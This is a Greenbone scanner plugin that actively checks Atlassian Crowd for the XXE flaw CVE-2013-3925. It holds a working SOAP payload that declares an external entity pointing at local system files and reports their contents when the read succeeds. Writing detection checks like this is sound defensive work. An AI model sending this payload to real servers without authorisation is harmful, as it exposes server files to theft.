# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:atlassian:crowd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803830");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-07-09 15:27:15 +0530 (Tue, 09 Jul 2013)");
  script_tag(name:"cvss_base", value:"5.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:N");

  script_cve_id("CVE-2013-3925");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Atlassian Crowd XXE Vulnerability (CWD-3366) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_atlassian_crowd_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("atlassian/crowd/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Atlassian Crowd is prone to an XML external entity (XXE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an incorrectly configured XML parser
  accepting XML external entities from an untrusted source.");

  script_tag(name:"impact", value:"Successful exploitation allows remote attackers to gain access
  to arbitrary files by sending specially crafted XML data.");

  script_tag(name:"affected", value:"Atlassian Crowd version 2.5.x through 2.5.3, 2.6.x through
  2.6.2, 2.3.8 and 2.4.9.");

  script_tag(name:"solution", value:"Update to version 2.5.4, 2.6.3, 2.7 or later.");

  script_xref(name:"URL", value:"https://jira.atlassian.com/browse/CWD-3366");
  script_xref(name:"URL", value:"http://www.commandfive.com/papers/C5_TA_2013_3925_AtlassianCrowd.pdf");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/60899");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/crowd/services/2/";
req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if (res && "Invalid SOAP request" >< res) {

  files = traversal_files();
  entity =  rand_str(length:8, charset:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");

  foreach pattern (keys(files)) {

    file = files[pattern];

    soap = '<!DOCTYPE x [ <!ENTITY '+ entity + ' SYSTEM "file:///' + file + '"> ]>' +
           '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">' +
           '<s:Body>' +
           '<authenticateApplication xmlns="urn:SecurityServer">' +
           '<in0 ' +
           'xmlns:a="http://authentication.integration.crowd.atlassian.com" ' +
           'xmlns:i="http://www.w3.org/2001/XMLSchema-instance">' +
           '<a:credential>' +
           '<a:credential>password</a:credential>' +
           '<a:encryptedCredential>&' + entity + ';</a:encryptedCredential>' +
           '</a:credential>' +
           '<a:name>username</a:name>' +
           '<a:validationFactors i:nil="true"/>' +
           '</in0>' +
           '</authenticateApplication>' +
           '</s:Body>' +
           '</s:Envelope>';

    headers = make_array("SOAPAction", '""',
                         "Content-Type", "text/xml; charset=UTF-8");

    req = http_post_put_req(port: port, url: url, data: soap, add_headers: headers);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

    if (egrep(pattern: pattern, string: res)) {
      report = 'It was possible to read the file "' + file + '".\n\nResult:\n\n' + res;
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
